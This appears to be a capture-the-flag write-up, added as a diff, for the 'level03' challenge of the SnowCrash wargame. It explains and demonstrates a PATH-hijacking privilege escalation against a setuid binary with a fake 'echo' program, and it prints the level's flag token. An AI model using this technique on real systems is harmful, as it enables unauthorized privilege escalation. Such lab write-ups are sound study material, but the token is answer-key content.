@@ -1,0 +1,27 @@
+#a binary file can be found in the user directory
+ls -l
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+#we can see that it has special permissions.
+#these permissions mean that it is a setuid and setgid binary.
+#using "ltrace ./level03" we can see that it calls "/usr/bin/env echo"
+#any call made by a setuid binary will use that uid permissions for its calls
+#by writing a fake echo binary and changing the PATH to force its use we can
+#make any calls we like with the permissions of the uid set in the binary
+#some info https://www.riccardoancarani.it/exploting-setuid-setgid-binaries/
+
+level03@SnowCrash:~$ cd /tmp
+level03@SnowCrash:/tmp$ touch echo.c
+level03@SnowCrash:/tmp$ vim echo.c
+#echo.c:
+int main()
+{
+        system("/bin/getflag");
+        return(0);
+}
+
+level03@SnowCrash:/tmp$ gcc echo.c -o echo
+level03@SnowCrash:/tmp$ export PATH=/tmp:${PATH}
+level03@SnowCrash:/tmp$ cd
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
